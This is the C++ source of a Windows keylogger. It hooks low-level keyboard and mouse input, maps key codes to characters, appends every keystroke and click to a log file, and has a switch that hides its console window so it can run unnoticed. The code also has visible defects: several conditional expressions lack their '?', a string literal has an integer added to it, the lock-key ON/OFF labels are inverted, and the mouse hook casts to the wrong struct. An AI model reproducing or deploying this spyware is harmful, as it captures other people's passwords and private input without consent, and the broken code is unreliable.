#include "stdafx.h"
#include <fstream>
#include <string>
#include <iostream>
#include <windows.h>
#include <stdio.h>

#define HIDE_CONSOLE false
#define OUTPUT_PATH "../Log.txt"

using namespace std;

bool isCapsLockOn()
{
    if ((GetKeyState(VK_CAPITAL) & 1) != 0)
        return true;
    return false;
}

string getKeyString(DWORD vkCode)
{
    if (vkCode >= 0x30 && vkCode <= 0x39) // 0 - 9 with shift options
    {
        switch (vkCode)
        {
        case 0x30: return GetAsyncKeyState(VK_SHIFT) ? ")" : "0";
        case 0x31: return GetAsyncKeyState(VK_SHIFT) ? "!" : "1";
        case 0x32: return GetAsyncKeyState(VK_SHIFT) ? "@" : "2";
        case 0x33: return GetAsyncKeyState(VK_SHIFT) ? "#" : "3";
        case 0x34: return GetAsyncKeyState(VK_SHIFT) ? "$" : "4";
        case 0x35: return GetAsyncKeyState(VK_SHIFT) ? "%" : "5";
        case 0x36: return GetAsyncKeyState(VK_SHIFT) ? "^" : "6";
        case 0x37: return GetAsyncKeyState(VK_SHIFT) ? "&" : "7";
        case 0x38: return GetAsyncKeyState(VK_SHIFT) ? "*" : "8";
        case 0x39: return GetAsyncKeyState(VK_SHIFT) ? "(" : "9";
        }
    }

    else if (vkCode >= 0x41 && vkCode <= 0x5A) // a - z
    {
        if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLockOn()))
            return string(1, (char)tolower(vkCode));
        return string(1, (char)vkCode);
    }

    else if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9) // numpad numbers
    {
        return to_string(vkCode - VK_NUMPAD0);
    }

    else if (vkCode >= VK_MULTIPLY && vkCode <= VK_DIVIDE) // numpad numbers
    {
        return string(1, (char)(vkCode - 0x40));
    }

    else if (vkCode >= VK_F1 && vkCode <= VK_F12) // F1 - F12.
    {
        // Translate Fx to numerical component
        return "[F" + to_string(vkCode - VK_F1 + 1) + "]";
    }

    else if (vkCode >= 0xBA && vkCode <= 0xC0)
    {
        switch (vkCode)
        {
        case 0xBA: return GetAsyncKeyState(VK_SHIFT) ":" : ";";
        case 0xBB: return GetAsyncKeyState(VK_SHIFT) "+" : "=";
        case 0xBC: return GetAsyncKeyState(VK_SHIFT) "<" : ",";
        case 0xBD: return GetAsyncKeyState(VK_SHIFT) "_" : "-";
        case 0xBE: return GetAsyncKeyState(VK_SHIFT) ">" : ".";
        case 0xBF: return GetAsyncKeyState(VK_SHIFT) "?" : "/";
        case 0xC0: return GetAsyncKeyState(VK_SHIFT) "~" : "`";
        }
    }

    else if (vkCode >= 0xDB && vkCode <= 0xDE)
    {
        switch (vkCode)
        {
        case 0xDB: return GetAsyncKeyState(VK_SHIFT) "{" : "[";
        case 0xDC: return GetAsyncKeyState(VK_SHIFT) "|" : "\\";
        case 0xDD: return GetAsyncKeyState(VK_SHIFT) "}" : "]";
        case 0xDE: return GetAsyncKeyState(VK_SHIFT) "\"" : "'";
        }
    }

    else if (vkCode) // special
    {
        switch (vkCode)
        {
        case VK_LSHIFT: return "<LSHIFT>";
        case VK_RSHIFT: return "<RSHIFT>";

        case VK_RETURN: return "<ENTER>";
        case VK_CAPITAL: return string("<CAPLOCK; NOW ") + ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ? "OFF>" : "ON>");
        case VK_NUMLOCK: return string("<NUMLOCK; NOW ") + ((GetKeyState(VK_NUMLOCK) & 0x0001) != 0 ? "OFF>" : "ON>");

        case VK_LCONTROL: return "<LCTRL>";
        case VK_RCONTROL: return "<RCTRL>";

        case VK_INSERT: return "<INSERT>";

        case VK_HOME: return "<HOME>";
        case VK_END: return "<END>";

        case VK_PRINT: return "<PRINT>";
        case VK_DELETE: return "<DEL>";

        case VK_BACK: return "<BK>";
        case VK_LEFT: return "<LEFT>";
        case VK_RIGHT: return "<RIGHT>";
        case VK_UP: return "<UP>";
        case VK_DOWN: return "<DOWN>";

        case VK_SPACE: return " ";
        case VK_ESCAPE: return "<ESC>";
        case VK_TAB: return "<TAB>";

        case VK_LWIN: return "<LWIN>";
        case VK_RWIN: return "<RWIN>";
        }
    }
    return "<UNMAPPED VK CODE: " + vkCode + '>';
}

string getMouseString(WPARAM wParam)
{
    switch (wParam)
    {
    case WM_LBUTTONDBLCLK:  return "<DBL LMOUSE>";
    case WM_LBUTTONDOWN:    return "<LMOUSE>";

    case WM_RBUTTONDBLCLK:  return "<DBL RMOUSE>";
    case WM_RBUTTONDOWN:    return "<RMOUSE>";

    case WM_MOUSEWHEEL:     return "<WHEEL>";
    case WM_MBUTTONDOWN:    return "<CLICK WHEEL>";
    }
    return "";
}

void handleStream(string word)
{
    if (word.length() > 0)
    {
        // Log to file
        ofstream output_stream(OUTPUT_PATH, ios_base::app | ios_base::out);
        output_stream << word;

        // Log to console
        if (!HIDE_CONSOLE)
        {
            cout << word << endl;

        }
    }
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT p = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);

    if (wParam == WM_KEYDOWN)
    {
        handleStream(getKeyString(p->vkCode));
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT p = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);

    handleStream(getMouseString(wParam));

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
    // Clear the file
    ofstream output_stream(OUTPUT_PATH, ios_base::out | ios_base::trunc);
    output_stream.flush();
    output_stream.close();

    if (HIDE_CONSOLE)
    {
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    }

    HHOOK keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);
    HHOOK mouse = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, NULL, NULL);

    MSG msg;

    while (!GetMessage(&msg, NULL, NULL, NULL))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboard);
    UnhookWindowsHookEx(mouse);
}
